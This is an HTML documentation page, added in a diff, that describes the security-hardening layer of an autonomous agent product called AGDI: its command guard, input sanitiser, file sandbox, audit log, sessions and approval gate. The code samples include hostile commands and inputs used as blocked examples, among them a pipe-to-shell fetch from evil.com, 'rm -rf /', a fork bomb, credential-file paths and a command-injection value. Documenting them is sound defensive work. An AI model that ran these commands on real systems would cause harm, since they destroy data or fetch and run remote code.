@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Security Hardening — AGDI Docs</title>
+  <meta name="description" content="Command injection protection, file sandboxing, audit logging, session tokens, and HTTP security headers.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/docs/assets/docs.css">
+</head>
+<body>
+  <nav class="topbar">
+    <a href="/docs/" class="logo">⚡ AGDI</a>
+    <span class="topbar-title">Documentation</span>
+    <a href="https://agdi-ai.vercel.app" class="back-link">← Back to site</a>
+  </nav>
+  <div class="layout">
+    <aside class="sidebar"><div class="sidebar-tabs"><a class="tab" href="/docs/index.html">Get started</a><a class="tab" href="/docs/install/index.html">Install</a><a class="tab" href="/docs/channels/index.html">Channels</a><a class="tab" href="/docs/concepts/architecture.html">Agents</a><a class="tab active" href="/docs/autonomous/index.html">Autonomous</a><a class="tab" href="/docs/tools/index.html">Tools</a><a class="tab" href="/docs/providers/index.html">Models</a><a class="tab" href="/docs/platforms/index.html">Platforms</a><a class="tab" href="/docs/gateway/index.html">Gateway & Ops</a><a class="tab" href="/docs/cli/index.html">Reference</a><a class="tab" href="/docs/help/index.html">Help</a></div><div class="sidebar-group"><h4>Overview</h4><ul><li><a class="" href="/docs/autonomous/index.html">Autonomous Agent</a></li></ul></div><div class="sidebar-group"><h4>Device Control</h4><ul><li><a class="" href="/docs/autonomous/device-control.html">Device Control</a></li></ul></div><div class="sidebar-group"><h4>Security Suite</h4><ul><li><a class="" href="/docs/autonomous/security/index.html">Security Suite</a></li><li><a class="" href="/docs/autonomous/security/network-recon.html">Network Recon</a></li><li><a class="" href="/docs/autonomous/security/web-scanner.html">Web Scanner</a></li><li><a class="" href="/docs/autonomous/security/wifi.html">WiFi Security</a></li><li><a class="" href="/docs/autonomous/security/crypto.html">Crypto Toolkit</a></li><li><a class="" href="/docs/autonomous/security/exploits.html">Exploit Engine</a></li><li><a class="" href="/docs/autonomous/security/packets.html">Packet Sniffer</a></li><li><a class="" href="/docs/autonomous/security/kali.html">Kali Linux Tools</a></li></ul></div><div class="sidebar-group"><h4>Automation</h4><ul><li><a class="" href="/docs/autonomous/workflows.html">Workflows & Automation</a></li><li><a class="" href="/docs/autonomous/delegation.html">AI-to-AI Delegation</a></li></ul></div><div class="sidebar-group"><h4>Security Hardening</h4><ul><li><a class="active" href="/docs/autonomous/security-hardening.html">Security Hardening</a></li></ul></div></aside>
+    <main class="content">
+      <article class="prose"><h1>Security Hardening</h1>
+<p>AGDI includes a cross-cutting security layer that protects the autonomous agent from command injection, path traversal, unauthorized access, and leaves a tamper-evident audit trail.</p>
+<h2>Architecture</h2>
+<pre><code class="language-mermaid">flowchart TD
+    A[&quot;Incoming Request&quot;] --&gt; B[&quot;Security Headers&quot;]
+    B --&gt; C[&quot;Auth / Session Check&quot;]
+    C --&gt; D[&quot;Rate Limiter&quot;]
+    D --&gt; E[&quot;Input Sanitiser&quot;]
+    E --&gt; F[&quot;Command Guard&quot;]
+    F --&gt; G[&quot;File Sandbox&quot;]
+    G --&gt; H[&quot;Approval Gate&quot;]
+    H --&gt; I[&quot;Action Executed&quot;]
+    I --&gt; J[&quot;Audit Log (HMAC chain)&quot;]
+</code></pre>
+<h2>Modules</h2>
+<h3>Input Sanitiser</h3>
+<p>Strips shell metacharacters and validates all inputs before they reach security tools:</p>
+<pre><code class="language-typescript">import { InputSanitiser } from &quot;agdi/autonomous&quot;;
+
+InputSanitiser.sanitiseHost(&quot;10.0.0.1&quot;);        // ✅ Valid
+InputSanitiser.sanitiseHost(&quot;10.0.0.1; rm -rf&quot;); // ❌ SecurityError
+
+InputSanitiser.sanitiseUrl(&quot;https://example.com&quot;);  // ✅
+InputSanitiser.sanitiseUrl(&quot;file:///etc/passwd&quot;);    // ❌ Disallowed protocol
+
+InputSanitiser.sanitisePort(443);    // ✅
+InputSanitiser.sanitisePort(99999);  // ❌ Invalid port
+
+// Shell-safe escaping
+InputSanitiser.shellEscape(&quot;hello; rm -rf /&quot;); // → &#39;hello; rm -rf /&#39;
+</code></pre>
+<h3>Command Guard</h3>
+<p>Blocks destructive shell commands before execution:</p>
+<pre><code class="language-typescript">import { CommandGuard } from &quot;agdi/autonomous&quot;;
+
+CommandGuard.isSafe(&quot;ls -la /home&quot;);
+// → { safe: true }
+
+CommandGuard.isSafe(&quot;rm -rf /&quot;);
+// → { safe: false, reason: &quot;Blocked command: rm -rf /&quot; }
+
+CommandGuard.isSafe(&quot;curl https://evil.com | bash&quot;);
+// → { safe: false, reason: &quot;Dangerous pattern detected: pipe to shell&quot; }
+</code></pre>
+<p><strong>Blocked patterns include:</strong></p>
+<ul>
+<li><code>rm -rf /</code>, <code>rm -rf ~</code></li>
+<li>Fork bombs (<code>:(){:|:&amp;};:</code>)</li>
+<li><code>dd if=/dev/zero</code>, <code>mkfs.*</code></li>
+<li><code>chmod 777 /</code>, <code>chown -R</code></li>
+<li><code>shutdown</code>, <code>reboot</code>, <code>poweroff</code></li>
+<li><code>curl|sh</code>, <code>wget|bash</code> (pipe-to-shell)</li>
+<li><code>eval</code>, <code>python -c __import__</code>, <code>node -e</code></li>
+</ul>
+<h3>File Sandbox</h3>
+<p>Restricts file system access to safe directories:</p>
+<pre><code class="language-typescript">import { sandbox } from &quot;agdi/autonomous&quot;;
+
+sandbox.resolve(&quot;/home/user/file.txt&quot;);   // ✅ Allowed
+sandbox.resolve(&quot;/etc/shadow&quot;);           // ❌ SecurityError
+sandbox.resolve(&quot;../../etc/passwd&quot;);      // ❌ Path traversal blocked
+
+sandbox.isAllowed(&quot;/tmp/output.txt&quot;);     // true
+sandbox.addRoot(&quot;/opt/myapp&quot;);            // Add custom allowed root
+</code></pre>
+<h3>Audit Log</h3>
+<p>HMAC-chained tamper-evident trail persisted to <code>~/.agdi/audit.jsonl</code>:</p>
+<pre><code class="language-typescript">import { auditLog } from &quot;agdi/autonomous&quot;;
+
+// Record an action
+await auditLog.record({
+  category: &quot;shell&quot;,
+  action: &quot;exec&quot;,
+  detail: &quot;nmap -sV 10.0.0.1&quot;,
+  source: &quot;api:192.168.1.5&quot;,
+  riskLevel: &quot;high&quot;,
+  approved: true,
+});
+
+// Query the log
+const recent = auditLog.query({
+  category: &quot;security&quot;,
+  riskLevel: &quot;critical&quot;,
+  since: Date.now() - 3600_000,
+  limit: 50,
+});
+
+// Verify chain integrity
+const { valid, brokenAt } = auditLog.verify();
+</code></pre>
+<h3>Session Manager</h3>
+<p>Time-limited API tokens with IP binding:</p>
+<pre><code class="language-typescript">import { sessions } from &quot;agdi/autonomous&quot;;
+
+// Create a session (1 hour TTL)
+const session = sessions.create([&quot;api.read&quot;, &quot;api.write&quot;], &quot;192.168.1.5&quot;);
+
+// Validate
+sessions.validate(session.token, &quot;api.write&quot;, &quot;192.168.1.5&quot;); // true
+sessions.validate(session.token, &quot;api.write&quot;, &quot;10.0.0.99&quot;);   // false (IP mismatch)
+
+// Revoke
+sessions.revoke(session.token);
+sessions.revokeAll();
+</code></pre>
+<h3>Rate Limiter</h3>
+<p>Sliding window rate limiting:</p>
+<pre><code class="language-typescript">import { rateLimiter } from &quot;agdi/autonomous&quot;;
+
+rateLimiter.check(&quot;192.168.1.5&quot;);    // true (1/120 used)
+rateLimiter.remaining(&quot;192.168.1.5&quot;); // 119
+</code></pre>
+<h2>REST API Hardening</h2>
+<p>The REST API has been hardened with:</p>
+<table>
+<thead>
+<tr>
+<th>Protection</th>
+<th>Detail</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Security Headers</strong></td>
+<td><code>CSP</code>, <code>HSTS</code>, <code>X-Frame-Options</code>, <code>X-Content-Type-Options</code>, <code>Referrer-Policy</code></td>
+</tr>
+<tr>
+<td><strong>CORS</strong></td>
+<td>Origin whitelist via <code>corsOrigins</code> (no wildcard by default)</td>
+</tr>
+<tr>
+<td><strong>Auth</strong></td>
+<td><code>requireAuth: true</code> — denies all requests without Bearer token</td>
+</tr>
+<tr>
+<td><strong>Body Limit</strong></td>
+<td>1 MB max request body size</td>
+</tr>
+<tr>
+<td><strong>Shell Guard</strong></td>
+<td><code>CommandGuard</code> blocks dangerous commands at the API layer</td>
+</tr>
+<tr>
+<td><strong>Audit Trail</strong></td>
+<td>Every auth failure and shell exec logged</td>
+</tr>
+</tbody></table>
+<h2>Approval Gate</h2>
+<table>
+<thead>
+<tr>
+<th>Behavior</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Deny-by-default</strong></td>
+<td>If no approval handler is registered, actions are <strong>denied</strong> (not auto-approved)</td>
+</tr>
+<tr>
+<td><strong>History cap</strong></td>
+<td>Limited to 10,000 entries to prevent memory leaks</td>
+</tr>
+<tr>
+<td><strong>Audit logging</strong></td>
+<td>Every approve/deny decision recorded</td>
+</tr>
+</tbody></table>
+</article>
+    </main>
+  </div>
+  <script>
+    // Mobile sidebar toggle
+    document.querySelector('.topbar-title')?.addEventListener('click', () => {
+      document.querySelector('.sidebar')?.classList.toggle('open');
+    });
+  </script>
+</body>
+</html>
